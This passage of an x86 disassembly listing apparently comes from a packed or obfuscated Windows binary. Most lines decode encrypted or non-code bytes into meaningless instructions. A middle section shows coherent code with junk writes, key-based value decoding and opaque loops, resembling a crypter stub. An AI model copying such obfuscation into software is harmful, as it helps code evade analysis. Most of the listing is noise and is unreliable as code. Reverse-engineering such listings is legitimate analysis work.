  40cce8:	xor    BYTE PTR [edx],0x82
  40cceb:	xchg   ebx,eax
  40ccec:	je     0x40cc77
  40ccee:	lods   al,BYTE PTR ds:[esi]
  40ccef:	stos   DWORD PTR es:[edi],eax
  40ccf0:	and    bl,bl
  40ccf2:	das    
  40ccf3:	jmp    0xd9ad:0xe5d55373
  40ccfa:	pop    ebx
  40ccfb:	push   edi
  40ccfc:	sti    
  40ccfd:	cmp    al,0x1c
  40ccff:	(bad)  
  40cd00:	sbb    ch,BYTE PTR [edi+eiz*8-0x46]
  40cd04:	mov    ds:0x5a6e7f5a,eax
  40cd09:	xchg   DWORD PTR [esi+0x5f],ebp
  40cd0c:	ss out 0xae,eax
  40cd0f:	adc    edx,DWORD PTR [edx+0x3d5ae5ed]
  40cd15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd16:	push   ecx
  40cd17:	push   ebp
  40cd18:	and    DWORD PTR [ebx],edx
  40cd1a:	pusha  
  40cd1b:	outs   dx,BYTE PTR ds:[esi]
  40cd1c:	int    0xcf
  40cd1e:	pop    ss
  40cd1f:	mov    al,0x80
  40cd21:	popa   
  40cd22:	int    0xd6
  40cd24:	xlat   BYTE PTR ds:[ebx]
  40cd25:	and    dh,BYTE PTR [edi-0x7a]
  40cd28:	ins    BYTE PTR es:[edi],dx
  40cd29:	outs   dx,DWORD PTR ds:[esi]
  40cd2a:	cmp    eax,DWORD PTR [edx-0x2ef04e68]
  40cd30:	loopne 0x40cd2b
  40cd32:	mov    ebp,0xbb86d999
  40cd37:	test   DWORD PTR [esi-0x41],ecx
  40cd3a:	imul   DWORD PTR [ebx-0x2f]
  40cd3d:	pop    edx
  40cd3e:	lods   eax,DWORD PTR ds:[esi]
  40cd3f:	or     al,0x58
  40cd41:	inc    edx
  40cd42:	mov    eax,0x8f82e676
  40cd47:	inc    esp
  40cd48:	int    0x8b
  40cd4a:	add    DWORD PTR [eax+eiz*1-0x4b],0xbb6de505
  40cd52:	in     eax,0x6d
  40cd54:	imul   edi,DWORD PTR [ecx+0x59de2534],0xffffffe6
  40cd5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd5c:	imul   BYTE PTR [esi+0x68]
  40cd5f:	pop    ebx
  40cd60:	sub    al,0x6c
  40cd62:	outs   dx,DWORD PTR ds:[esi]
  40cd63:	or     BYTE PTR [esi-0x37b10925],0x76
  40cd6a:	cmp    eax,DWORD PTR [edx-0x8df6794]
  40cd70:	xor    dh,bh
  40cd72:	sti    
  40cd73:	or     cl,BYTE PTR [edi+0x3e]
  40cd76:	mov    ah,0xdb
  40cd78:	xor    al,0x91
  40cd7a:	push   0x27
  40cd7c:	pop    ds
  40cd7d:	ins    DWORD PTR es:[edi],dx
  40cd7e:	push   edi
  40cd7f:	jo     0x40cdcc
  40cd81:	pop    ebx
  40cd82:	pop    gs
  40cd84:	in     al,0x3d
  40cd86:	mov    DWORD PTR [esi+0x32],eax
  40cd89:	mov    ah,0x20
  40cd8b:	dec    esi
  40cd8c:	or     eax,0x24c5a6a9
  40cd91:	adc    ebp,DWORD PTR [edx]
  40cd93:	rcr    DWORD PTR ds:0xc157368b,cl
  40cd99:	bound  edx,QWORD PTR [edx]
  40cd9b:	or     DWORD PTR [edi-0x69],ebx
  40cd9e:	sti    
  40cd9f:	lahf   
  40cda0:	dec    esp
  40cda1:	dec    edx
  40cda2:	jb     0x40cd2f
  40cda4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cda5:	or     ebx,DWORD PTR [esi]
  40cda7:	dec    ecx
  40cda8:	mov    dh,0x8b
  40cdaa:	mov    ?,WORD PTR [edx]
  40cdac:	sbb    esi,DWORD PTR [edx+edx*8-0x3]
  40cdb0:	dec    ebx
  40cdb1:	jl     0x40cda7
  40cdb3:	(bad)  
  40cdb4:	call   0xafa542db
  40cdb9:	(bad)  
  40cdba:	not    ebx
  40cdbc:	mov    dl,0xde
  40cdbe:	repnz and dh,bh
  40cdc1:	pop    edx
  40cdc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdc3:	sub    ebp,DWORD PTR ds:0x3c9e1a98
  40cdc9:	(bad)
  40cdcc:	shl    BYTE PTR [esi-0x54],1
  40cdcf:	and    esi,DWORD PTR [ebx]
  40cdd1:	(bad)  
  40cdd2:	fld    DWORD PTR [esi-0x5a259caf]
  40cdd8:	xor    esp,DWORD PTR [ebp+eiz*1+0x74]
  40cddc:	outs   dx,BYTE PTR ds:[esi]
  40cddd:	or     DWORD PTR [esi-0x16],0x25
  40cde1:	mov    ecx,0x28d06d55
  40cde6:	in     al,dx
  40cde7:	and    al,0x26
  40cde9:	jno    0x40ce4b
  40cdeb:	jb     0x40ce16
  40cded:	dec    edx
  40cdee:	imul   edi,DWORD PTR [eax-0x212d50d8],0x30
  40cdf5:	cmp    eax,0x54e146c4
  40cdfa:	int    0x13
  40cdfc:	fst    QWORD PTR [edx]
  40cdfe:	fsubrp st(7),st
  40ce00:	in     eax,0x4b
  40ce02:	sub    edx,DWORD PTR [esi-0x6a0a0a06]
  40ce08:	(bad)  
  40ce09:	ja     0x40cdb4
  40ce0b:	jb     0x40ce4b
  40ce0d:	test   BYTE PTR ds:0xc1a0236f,bh
  40ce13:	xor    DWORD PTR [edx-0xe],esp
  40ce16:	or     ch,ah
  40ce18:	test   eax,0xf6fa9754
  40ce1d:	sub    BYTE PTR [ebp-0x3f6a9279],dh
  40ce23:	xchg   edi,eax
  40ce24:	and    eax,0xe8a3a312
  40ce29:	xchg   edi,eax
  40ce2a:	mov    eax,DWORD PTR [ecx-0x772a0e8e]
  40ce30:	push   ecx
  40ce31:	sbb    eax,esp
  40ce33:	jns    0x40cea6
  40ce35:	out    0xb9,eax
  40ce37:	lahf   
  40ce38:	mov    cl,0x1f
  40ce3a:	dec    esp
  40ce3b:	mov    ds:0x5b9e4aae,eax
  40ce40:	aad    0x32
  40ce42:	push   ss
  40ce43:	iret   
  40ce44:	mov    BYTE PTR [edi+0x6],al
  40ce47:	inc    ebx
  40ce48:	pusha  
  40ce49:	rcr    DWORD PTR [ebp+edi*4+0xcad2c7e],cl
  40ce50:	cli    
  40ce51:	mov    ebx,0x41f007f8
  40ce56:	push   ebp
  40ce57:	out    dx,eax
  40ce58:	sti    
  40ce59:	or     eax,0xaeed55ca
  40ce5e:	jns    0x40cea9
  40ce60:	shl    DWORD PTR [ebp+0x4],cl
  40ce63:	pop    edx
  40ce64:	mov    ebp,DWORD PTR [edx+0x6d]
  40ce67:	rcr    DWORD PTR [eax],cl
  40ce69:	das    
  40ce6a:	les    esi,FWORD PTR [edi+ebp*1+0x4f]
  40ce6e:	or     BYTE PTR ds:0xf9d6f71b,al
  40ce74:	mov    ch,0x81
  40ce76:	out    dx,eax
  40ce77:	sti    
  40ce78:	(bad)  
  40ce79:	xor    al,0xe2
  40ce7b:	fwait
  40ce7c:	fwait
  40ce7d:	add    esp,eax
  40ce7f:	xor    eax,ebx
  40ce81:	adc    DWORD PTR [esi-0x6bc96e4a],eax
  40ce87:	mov    WORD PTR [ebx-0x1b],fs
  40ce8a:	push   esp
  40ce8b:	or     eax,DWORD PTR [esi]
  40ce8d:	ins    DWORD PTR es:[edi],dx
  40ce8e:	dec    esi
  40ce8f:	and    DWORD PTR [eax+0x667c85ab],ebx
  40ce95:	jge    0x40ce2e
  40ce97:	ins    BYTE PTR es:[edi],dx
  40ce98:	add    BYTE PTR [ecx],bh
  40ce9a:	push   es
  40ce9b:	je     0x40ce4e
  40ce9d:	inc    esp
  40ce9e:	icebp  
  40ce9f:	loopne 0x40cf06
  40cea1:	xchg   ecx,eax
  40cea2:	shr    DWORD PTR [esi-0xb],cl
  40cea5:	dec    ebp
  40cea6:	popf   
  40cea7:	je     0x40ce41
  40cea9:	rcl    BYTE PTR [ebp-0x5fef9e6f],0x79
  40ceb0:	out    dx,al
  40ceb1:	cmc    
  40ceb2:	jbe    0x40ce96
  40ceb4:	(bad)  
  40ceb5:	loope  0x40ced4
  40ceb7:	mov    ds:0x1508b361,al
  40cebc:	cmp    esp,ebp
  40cebe:	xchg   ebp,eax
  40cebf:	dec    edi
  40cec0:	imul   eax,edx,0xffffff98
  40cec3:	mov    ebp,0xbd1a2419
  40cec8:	jns    0x40ce51
  40ceca:	shr    cl,cl
  40cecc:	jl     0x40cead
  40cece:	adc    cl,BYTE PTR [eax+0x3bc20e4c]
  40ced4:	push   ebp
  40ced5:	adc    BYTE PTR fs:[esi-0x78ea1cc9],cl
  40cedc:	es ja  0x40cf20
  40cedf:	add    ebx,esp
  40cee1:	push   esi
  40cee2:	cdq    
  40cee3:	daa    
  40cee4:	push   0xf05aac3b
  40cee9:	repnz or eax,0xc6ea9bb1
  40ceef:	scas   al,BYTE PTR es:[edi]
  40cef0:	call   0x7f4f:0x316b0282
  40cef7:	int    0xe2
  40cef9:	shl    BYTE PTR [eax],cl
  40cefb:	push   0x5a
  40cefd:	sub    DWORD PTR [eax+0x39816174],edi
  40cf03:	dec    eax
  40cf04:	call   0xfa1b5c00
  40cf09:	jno    0x40ceb5
  40cf0b:	rcr    BYTE PTR [ecx],1
  40cf0d:	xor    eax,DWORD PTR [ebx+edi*4-0x6d]
  40cf11:	mov    ch,0x4f
  40cf13:	add    bh,BYTE PTR [esi+0x75]
  40cf16:	pop    ss
  40cf17:	daa    
  40cf18:	pop    es
  40cf19:	ret    
  40cf1a:	fisubr DWORD PTR [edi]
  40cf1c:	ror    BYTE PTR [ebx-0x30ba25e7],0x38
  40cf23:	xchg   DWORD PTR [eax],ebx
  40cf25:	mov    ah,0x55
  40cf27:	inc    edi
  40cf28:	lea    eax,[eax-0x70]
  40cf2b:	cmp    al,0xb6
  40cf2d:	adc    BYTE PTR [eax+edi*2+0x75],al
  40cf31:	push   esp
  40cf32:	ret    0xa8c1
  40cf35:	jmp    0x40cf60
  40cf37:	dec    ebp
  40cf38:	daa    
  40cf39:	retf   0x8245
  40cf3c:	cli    
  40cf3d:	mov    ds:0x9c6dde4,eax
  40cf42:	into   
  40cf43:	retf   0xa358
  40cf46:	jg     0x40cf70
  40cf48:	or     eax,0x4f1c6251
  40cf4d:	out    dx,eax
  40cf4e:	inc    eax
  40cf4f:	xor    edx,esi
  40cf51:	xchg   esi,eax
  40cf52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf53:	outs   dx,DWORD PTR ds:[esi]
  40cf54:	stos   DWORD PTR es:[edi],eax
  40cf55:	loopne 0x40cf55
  40cf57:	(bad)  
  40cf58:	mov    eax,0x67e6bdcb
  40cf5d:	lds    eax,FWORD PTR [ecx+esi*4+0xd61bbe5]
  40cf64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf65:	fisttp QWORD PTR [ebx+0x61]
  40cf68:	xor    eax,DWORD PTR [eax]
  40cf6a:	mov    ch,0x25
  40cf6c:	aas    
  40cf6d:	ins    DWORD PTR es:[edi],dx
  40cf6e:	push   esi
  40cf6f:	push   edi
  40cf70:	sub    BYTE PTR [eax+0x1e],dl
  40cf73:	jge    0x40cf08
  40cf75:	or     DWORD PTR [eax+0x4f],eax
  40cf78:	ret    
  40cf79:	cmp    ah,BYTE PTR [ebp+ebp*2-0x3e934b0c]
  40cf80:	jge    0x40cf08
  40cf82:	ins    BYTE PTR es:[edi],dx
  40cf83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf84:	and    BYTE PTR [edi],bh
  40cf86:	in     al,0x5f
  40cf88:	push   ss
  40cf89:	test   eax,0x2fa099c0
  40cf8e:	push   esi
  40cf8f:	ror    dl,1
  40cf91:	gs dec esp
  40cf93:	cmp    bl,BYTE PTR [ebp+0x60]
  40cf96:	popf   
  40cf97:	inc    ecx
  40cf98:	mov    bl,0xe0
  40cf9a:	xchg   ebp,eax
  40cf9b:	lods   al,BYTE PTR ds:[esi]
  40cf9c:	clc    
  40cf9d:	add    al,0x39
  40cf9f:	mov    WORD PTR ds:[ebx+0x7a5b8ab3],gs
  40cfa6:	mov    bh,0x8c
  40cfa8:	fcmove st,st(7)
  40cfaa:	mov    dl,0xd2
  40cfac:	sub    BYTE PTR [ebp+0x20e6389f],0x44
  40cfb3:	pop    eax
  40cfb4:	jbe    0x40cf86
  40cfb6:	out    0xc8,al
  40cfb8:	jb     0x40cff9
  40cfba:	or     DWORD PTR [edx],ebx
  40cfbc:	push   ss
  40cfbd:	je     0x40d00f
  40cfbf:	jecxz  0x40cff4
  40cfc1:	add    DWORD PTR [ecx+0x71],edi
  40cfc4:	call   0xdd3e01a0
  40cfc9:	and    ecx,DWORD PTR ds:0x3963a34
  40cfcf:	in     al,0x7a
  40cfd1:	mov    dl,BYTE PTR [esi+0xc882f0]
  40cfd7:	or     ebx,DWORD PTR [esi-0x6f3f235b]
  40cfdd:	(bad)  
  40cfde:	rcr    BYTE PTR [esi-0x1eeb744],cl
  40cfe4:	mov    edx,0x70f1d30a
  40cfe9:	push   ds
  40cfea:	mov    al,ds:0xd98f69fb
  40cfef:	and    DWORD PTR [ecx-0x5d],ecx
  40cff2:	dec    esi
  40cff3:	xor    eax,0x57ae5ccd
  40cff8:	xchg   ebx,eax
  40cff9:	mov    eax,edi
  40cffb:	outs   dx,BYTE PTR ds:[esi]
  40cffc:	sub    BYTE PTR [ecx-0x48],bh
  40cfff:	lods   eax,DWORD PTR ds:[esi]
  40d000:	dec    ebp
  40d001:	fs cld 
  40d003:	aam    0xe1
  40d005:	mov    eax,0x884f1468
  40d00a:	cmp    al,0xfa
  40d00c:	jb     0x2e8d490d
  40d012:	or     esi,0x9e0383c5
  40d018:	mov    ebp,0x34ed8861
  40d01d:	xor    DWORD PTR [esi],ecx
  40d01f:	(bad)  
  40d020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d021:	loopne 0x40cff4
  40d023:	sub    dh,cl
  40d025:	ficom  DWORD PTR [ecx+0x55]
  40d028:	push   edi
  40d029:	loop   0x40d06e
  40d02b:	out    0x4,eax
  40d02d:	imul   BYTE PTR [ecx+esi*4-0xde36e22]
  40d034:	popa   
  40d035:	or     ebp,esi
  40d037:	es pop ebp
  40d039:	adc    BYTE PTR [esi+edi*8-0x7b],bh
  40d03d:	add    eax,0xbf42dd03
  40d042:	out    0x60,al
  40d044:	jo     0x40cfe9
  40d046:	je     0x40d0af
  40d048:	dec    ebp
  40d049:	or     eax,0xe37e3add
  40d04e:	in     al,dx
  40d04f:	xor    eax,0x3ac99430
  40d054:	fwait
  40d055:	mov    esp,0x3270d3bc
  40d05a:	adc    cl,BYTE PTR [edi]
  40d05c:	inc    edx
  40d05d:	cs (bad) 
  40d05f:	xchg   esp,eax
  40d060:	or     edx,DWORD PTR [eax+0x84d8bca]
  40d066:	sbb    DWORD PTR ds:0x42a2b6,0x42a2d2
  40d070:	add    ecx,DWORD PTR [eax+0x24]
  40d073:	and    DWORD PTR ds:0x42a2de,0x1336
  40d07d:	mov    DWORD PTR [ebp-0x34],ecx
  40d080:	mov    eax,DWORD PTR [ebp-0x14]
  40d083:	mov    ecx,DWORD PTR [ebp+0x8]
  40d086:	add    DWORD PTR ds:0x42a276,0x42a2a6
  40d090:	add    ecx,DWORD PTR [eax+0x1c]
  40d093:	mov    DWORD PTR ds:0x42a2ae,0x5cb0
  40d09d:	mov    DWORD PTR [ebp-0x14],ecx
  40d0a0:	mov    DWORD PTR ds:0x42a2f2,0x755c
  40d0aa:	jmp    0x40d194
  40d0af:	or     eax,ecx
  40d0b1:	mov    eax,DWORD PTR [ebp-0x2c]
  40d0b4:	xor    ecx,0x90a
  40d0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40d0bd:	adc    DWORD PTR ds:0x42a28e,0x25cc
  40d0c7:	add    ecx,DWORD PTR [eax+ebx*4]
  40d0ca:	mov    DWORD PTR [ebp-0x28],ecx
  40d0cd:	xor    eax,0x75c
  40d0d2:	mov    eax,DWORD PTR [ebp-0x4]
  40d0d5:	mov    ecx,DWORD PTR [ebp-0x28]
  40d0d8:	xor    eax,esi
  40d0da:	and    DWORD PTR ds:0x42a2ae,0x42a2c2
  40d0e4:	add    eax,edi
  40d0e6:	mov    DWORD PTR ds:0x42a2ea,0x1030
  40d0f0:	cmp    ecx,eax
  40d0f2:	mov    DWORD PTR ds:0x42a2c6,0xfb7
  40d0fc:	je     0x40d194
  40d102:	mov    DWORD PTR ds:0x42a262,0xed5
  40d10c:	jmp    0x40d185
  40d111:	and    DWORD PTR ds:0x42a2e2,0x0
  40d11b:	jmp    0x40d12d
  40d120:	mov    ecx,DWORD PTR ds:0x42a2e2
  40d126:	inc    ecx
  40d127:	mov    DWORD PTR ds:0x42a2e2,ecx
  40d12d:	cmp    DWORD PTR ds:0x42a2e2,0x10
  40d134:	jae    0x40d161
  40d13a:	cmp    DWORD PTR ds:0x42a2e2,0x15
  40d141:	jle    0x40d161
  40d147:	jmp    0x40d15c
  40d14c:	push   0x42a2ae
  40d151:	push   0x429181
  40d156:	call   DWORD PTR ds:0x42a3ca
  40d15c:	jmp    0x40d120
  40d161:	mov    eax,DWORD PTR [ebp-0x4]
  40d164:	mov    ecx,DWORD PTR [ebp-0x8]
  40d167:	xor    eax,esi
  40d169:	add    eax,edi
  40d16b:	cmp    ecx,eax
  40d16d:	mov    eax,DWORD PTR [ebp-0x4]
  40d170:	je     0x40d1cf
  40d176:	mov    ecx,DWORD PTR [ebp-0x30]
  40d179:	xor    eax,esi
  40d17b:	add    eax,edi
  40d17d:	cmp    ecx,eax
  40d17f:	je     0x40d1d8
  40d185:	lea    eax,[ebp-0x8]
  40d188:	push   eax
  40d189:	push   DWORD PTR [ebp-0x28]
  40d18c:	push   DWORD PTR [ebp+0xc]
  40d18f:	call   0x41622a
  40d194:	mov    eax,DWORD PTR [ebp-0x4]
  40d197:	mov    ecx,DWORD PTR [ebp-0x8]
  40d19a:	xor    eax,esi
  40d19c:	add    eax,edi
  40d19e:	cmp    ecx,eax
  40d1a0:	je     0x40d1bb
  40d1a6:	mov    eax,DWORD PTR [ebp-0x34]
  40d1a9:	movzx  eax,WORD PTR [eax+ebx*2]
  40d1ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40d1b0:	mov    eax,DWORD PTR [ecx+eax*4]
  40d1b3:	mov    DWORD PTR [ebp-0x38],eax
  40d1b6:	jmp    0x40d111
  40d1bb:	mov    eax,DWORD PTR [ebp-0xc]
  40d1be:	xor    eax,esi
  40d1c0:	lea    ebx,[ebx+eax*1+0x3272f1]
  40d1c7:	jmp    0x40872d
  40d1cc:	mov    eax,DWORD PTR [ebp-0x4]
  40d1cf:	xor    eax,esi
  40d1d1:	add    eax,edi
  40d1d3:	jmp    0x413da1
  40d1d8:	mov    eax,DWORD PTR [ebp-0x38]
  40d1db:	add    eax,DWORD PTR [ebp+0x8]
  40d1de:	mov    DWORD PTR [ebp-0x18],eax
  40d1e1:	mov    eax,DWORD PTR [ebp-0x1c]
  40d1e4:	test   eax,eax
  40d1e6:	je     0x40f60e
  40d1ec:	mov    DWORD PTR [ebp-0x20],0x0
  40d1f3:	push   0x3
  40d1f5:	xor    edx,edx
  40d1f7:	pop    edx
  40d1f8:	add    edx,0x8
  40d1fb:	push   edx
  40d1fc:	pop    ecx
  40d1fd:	push   0x6
  40d1ff:	dec    ecx
  40d200:	pop    ebx
  40d201:	dec    ebx
  40d202:	xchg   ebx,ecx
  40d204:	sub    ebx,ecx
  40d206:	xchg   ebx,ecx
  40d208:	dec    ecx
  40d209:	mov    eax,DWORD PTR [ebp-0x1c]
  40d20c:	imul   eax,ecx
  40d20f:	sub    esp,eax
  40d211:	mov    DWORD PTR [ebp-0x20],esp
  40d214:	mov    eax,DWORD PTR [ebp-0x4]
  40d217:	xor    eax,esi
  40d219:	add    eax,edi
  40d21b:	jmp    0x40f5e7
  40d220:	mov    ecx,DWORD PTR [ebp-0xc]
  40d223:	mov    eax,DWORD PTR [ebp+0x8]
  40d226:	mov    edx,DWORD PTR [ebp+0x14]
  40d229:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d22d:	xor    ecx,esi
  40d22f:	add    ecx,edi
  40d231:	xor    edx,edx
  40d233:	div    ecx
  40d235:	mov    ecx,DWORD PTR [ebp-0x4]
  40d238:	jmp    0x40f5c6
  40d23d:	adc    esp,DWORD PTR [eax-0x55]
  40d240:	jl     0x40d1c2
  40d242:	mov    eax,0x95ec0084
  40d247:	bound  ebp,QWORD PTR [ecx+0x13]
  40d24a:	sbb    bl,dl
  40d24c:	cmp    al,0xe9
  40d24e:	rol    DWORD PTR [ebx-0x7ca1f37d],cl
  40d254:	sub    DWORD PTR ds:0xe222eba,0xffffffdf
  40d25b:	stos   BYTE PTR es:[edi],al
  40d25c:	pop    esp
  40d25d:	int    0xa4
  40d25f:	and    BYTE PTR [eax-0x6b927e27],0x1
  40d266:	jae    0x40d273
  40d268:	or     al,0x6d
  40d26a:	sub    al,BYTE PTR [ebp+0x57]
  40d26d:	jae    0x40d2aa
  40d26f:	into   
  40d270:	ins    BYTE PTR es:[edi],dx
  40d271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d272:	das    
  40d273:	(bad)  
  40d274:	stc    
  40d275:	test   eax,0xdbee6655
  40d27a:	xchg   edx,eax
  40d27b:	xor    BYTE PTR [ebx*8+0x5ab08bc1],ch
  40d282:	rol    BYTE PTR [esi],cl
  40d284:	shl    bh,1
  40d286:	nop
  40d287:	mov    bl,0x8a
  40d289:	sub    al,dl
  40d28b:	xor    DWORD PTR [edi-0x2d],esp
  40d28e:	jnp    0x40d2dc
  40d290:	xor    ebp,ecx
  40d292:	retf   
  40d293:	dec    esp
  40d294:	inc    eax
  40d295:	or     bl,cl
  40d297:	dec    eax
  40d298:	push   esi
  40d299:	or     cl,bl
  40d29b:	inc    edi
  40d29c:	xchg   edi,eax
  40d29d:	adc    DWORD PTR [edx-0x5bc16d24],esp
  40d2a3:	das    
  40d2a4:	loopne 0x40d2e8
  40d2a6:	cwde   
  40d2a7:	mov    ebx,0xa8ff9a4a
  40d2ac:	dec    edi
  40d2ad:	je     0x40d2b8
  40d2af:	add    eax,0xbcbaefae
  40d2b4:	std    
  40d2b5:	cli    
  40d2b6:	cmc    
  40d2b7:	mov    WORD PTR [esi+ebx*2-0x5b],ss
  40d2bb:	or     bl,cl
  40d2bd:	iret   
  40d2be:	dec    esi
  40d2bf:	add    esi,DWORD PTR [ebx-0x680e4c17]
  40d2c5:	ja     0x40d259
  40d2c7:	cmp    DWORD PTR [esi-0x26f8451b],0x12
  40d2ce:	push   cs
  40d2cf:	test   eax,0xf6272db
  40d2d4:	cmp    eax,0x7efcd9a6
  40d2d9:	clc    
  40d2da:	mov    ebp,0x1a65a834
  40d2df:	add    ch,BYTE PTR [esi+0x1de712e2]
  40d2e5:	pop    ecx
  40d2e6:	jbe    0x40d2f8
  40d2e8:	jbe    0x40d316
  40d2ea:	ds jecxz 0x40d2a8
  40d2ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2ee:	or     al,0x72
  40d2f0:	cmp    al,0xe5
  40d2f2:	and    BYTE PTR [edx],al
  40d2f4:	sub    BYTE PTR [eax],bh
  40d2f6:	mov    dl,0xa1
  40d2f8:	inc    ebp
  40d2f9:	mov    ebx,fs
  40d2fb:	adc    eax,0x9b586391
  40d300:	ret    0x2a2a
  40d303:	hlt    
  40d304:	inc    ebx
  40d305:	lds    edx,FWORD PTR [edi-0x26fd7e80]
  40d30b:	sub    BYTE PTR [edi],bh
  40d30d:	push   ecx
  40d30e:	in     eax,dx
  40d30f:	and    DWORD PTR ds:0xa2fd2af9,edx
  40d315:	inc    ecx
  40d316:	jmp    0x40d361
  40d318:	inc    edx
  40d319:	mov    eax,ds:0xc0208864
  40d31e:	stos   DWORD PTR es:[edi],eax
  40d31f:	sub    DWORD PTR [esi-0x27],edx
  40d322:	and    DWORD PTR [edx-0x3d],edx
  40d325:	jge    0x40d37c
  40d327:	stos   BYTE PTR es:[edi],al
  40d328:	in     eax,dx
  40d329:	shr    DWORD PTR ds:0xffddd279,0x9b
  40d330:	pop    ecx
  40d331:	mov    ch,0xd1
  40d333:	ds in  eax,0x8d
  40d336:	add    BYTE PTR [eax],ah
  40d338:	fld    QWORD PTR [ebx-0xcf7861d]
  40d33e:	iret   
  40d33f:	(bad)  
  40d340:	sahf   
  40d341:	hlt    
  40d342:	and    eax,0xc9d202e1
  40d347:	or     DWORD PTR [edi],ebx
  40d349:	add    BYTE PTR [edi],dl
  40d34b:	fwait
  40d34c:	out    0x78,eax
  40d34e:	fdivr  DWORD PTR [ebx-0x35]
  40d351:	sti    
  40d352:	mov    fs,WORD PTR [ebp+0x21631cd9]
  40d358:	and    al,0x25
  40d35a:	sbb    edi,DWORD PTR [edi]
  40d35c:	loopne 0x40d382
  40d35e:	inc    esi
  40d35f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d360:	push   edx
  40d361:	sti    
  40d362:	pop    ebx
  40d363:	and    al,BYTE PTR [ebx+0x37b6ba6a]
  40d369:	cmc    
  40d36a:	retf   0x3d8f
  40d36d:	int    0x97
  40d36f:	xor    eax,0xc9e72f7b
  40d374:	pop    edx
  40d375:	push   0x3f
  40d377:	jns    0x40d324
  40d379:	call   0x6225583f
  40d37e:	or     esp,DWORD PTR [ebx+0x3918f934]
  40d384:	adc    eax,0x35a8d651
  40d389:	or     al,0x97
  40d38b:	sbb    eax,0x306004a9
  40d390:	out    dx,eax
  40d391:	js     0x40d3b1
  40d393:	xor    BYTE PTR fs:[edi],ah
  40d396:	lods   al,BYTE PTR ds:[esi]
  40d397:	mov    esp,0x21c24660
  40d39c:	mov    esi,0xc9ce1218
  40d3a1:	unpcklps xmm1,XMMWORD PTR [ebp+0x3f7af3bc]
  40d3a8:	daa    
  40d3a9:	jl     0x40d3ca
  40d3ab:	stos   BYTE PTR es:[edi],al
  40d3ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3ad:	sbb    dh,BYTE PTR [eax*8+0x20d44a1]
  40d3b4:	sbb    ebp,DWORD PTR [esi+0x62]
  40d3b7:	xor    ah,al
  40d3b9:	out    0xb9,al
  40d3bb:	jns    0x40d356
  40d3bd:	push   0xa81560a4
  40d3c2:	ret    0x3b46
  40d3c5:	fld    QWORD PTR [ecx+0x7c]
  40d3c8:	mov    DWORD PTR [ebp+0x3663f17e],ebp
  40d3ce:	or     eax,0x15e277a8
  40d3d3:	aad    0xce
  40d3d5:	xchg   edx,eax
  40d3d6:	in     eax,0xcd
  40d3d8:	cmp    ch,BYTE PTR [ebp-0x5f]
  40d3db:	fistp  DWORD PTR [edi-0x3ed1e67c]
  40d3e1:	mov    ds:0x35d92c5f,eax
  40d3e6:	shl    DWORD PTR [edx+0x4d],cl
  40d3e9:	jbe    0x40d397
  40d3eb:	pop    esp
  40d3ec:	sbb    DWORD PTR [bp+di-0xf],edi
  40d3f0:	push   esp
  40d3f1:	pop    ss
  40d3f2:	test   DWORD PTR [ecx],edi
  40d3f4:	ficom  WORD PTR [ecx]
  40d3f6:	sbb    BYTE PTR [edi-0x584f2cba],al
  40d3fc:	cdq    
  40d3fd:	(bad)  
  40d3fe:	scas   al,BYTE PTR es:[edi]
  40d3ff:	push   0x12
  40d401:	in     eax,0x60
  40d403:	std    
  40d404:	retf   
  40d405:	mov    ah,0xac
  40d407:	jecxz  0x40d40b
  40d409:	push   0xffffffb2
  40d40b:	outs   dx,DWORD PTR ds:[esi]
  40d40c:	add    al,0xa1
  40d40e:	shl    al,cl
  40d410:	rol    DWORD PTR [ebx+0x13bd5ab0],cl
  40d416:	fs push 0x43a09548
  40d41c:	xor    ah,dh
  40d41e:	mov    ebp,fs
  40d420:	adc    dl,BYTE PTR [eax]
  40d422:	lea    ebx,[ecx+0x5c]
  40d425:	mov    BYTE PTR [esi+0x75d4b30c],0xc6
  40d42c:	test   eax,0x4855653b
  40d431:	sbb    al,BYTE PTR [edi+esi*4]
  40d434:	push   ds
  40d435:	stos   DWORD PTR es:[edi],eax
  40d436:	aas    
  40d437:	aas    
  40d438:	push   ds
  40d439:	inc    esp
  40d43a:	les    esp,FWORD PTR [eax+0x1b]
  40d43d:	pushf  
  40d43e:	dec    esp
  40d43f:	adc    eax,0xdef0eff6
  40d444:	pop    esi
  40d445:	stos   BYTE PTR es:[edi],al
  40d446:	fistp  QWORD PTR [edx+0x61e0fd75]
  40d44c:	xchg   esp,eax
  40d44d:	and    BYTE PTR ds:0xc852e67f,0xd1
  40d454:	jbe    0x40d451
  40d456:	adc    dh,BYTE PTR [edi-0x7c]
  40d459:	dec    esp
  40d45a:	mov    fs,WORD PTR [ecx]
  40d45c:	jg     0x40d438
  40d45e:	add    DWORD PTR [edi+0x3f0f24a7],edx
  40d464:	xchg   edi,eax
  40d465:	xor    esi,DWORD PTR [edx+0x5512873d]
  40d46b:	out    0x52,eax
  40d46d:	pop    esi
  40d46e:	mov    al,ds:0x691d6a9
  40d473:	and    ebp,esi
  40d475:	ins    BYTE PTR es:[edi],dx
  40d476:	lds    esi,FWORD PTR [eax+ebp*1+0x10]
  40d47a:	xor    eax,0x104c5609
  40d47f:	out    0x66,eax
  40d481:	and    bh,BYTE PTR ds:0xb3e4d698
  40d487:	pop    ds
  40d488:	pop    esp
  40d489:	mov    ecx,0x11f461ce
  40d48e:	in     al,dx
  40d48f:	pop    ds
  40d490:	ror    bh,cl
  40d492:	jle    0x40d4a7
  40d494:	repnz loopne 0x40d44b
  40d497:	jle    0x40d4d3
  40d499:	jmp    0x9b86:0x21d2ebb3
  40d4a0:	sbb    edi,ebx
  40d4a2:	xchg   edi,ecx
  40d4a4:	dec    edi
  40d4a5:	jge    0x40d470
